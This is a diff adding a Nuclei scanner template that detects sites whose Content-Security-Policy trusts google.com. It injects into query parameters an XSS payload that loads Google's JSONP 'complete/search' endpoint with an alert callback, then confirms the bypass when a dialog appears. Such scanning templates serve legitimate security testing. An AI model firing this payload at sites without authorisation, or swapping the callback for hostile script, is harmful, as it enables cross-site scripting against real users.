@@ -1,0 +1,55 @@
+id: google-complete-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Google Complete
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,google-complete
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "google.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: google_complete_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "google_complete_csp_xss == true"
+# digest: 4a0a0047304502205c0f489a1d12bbc147bfbe3740ed54d0428599baf482ef416bb614e8ed3cb0f7022100a050298556fa18a9817f74677fb949f8ba3a2af86d46795343a01472d358d61a:922c64590222798bb761d5b6d8e72950
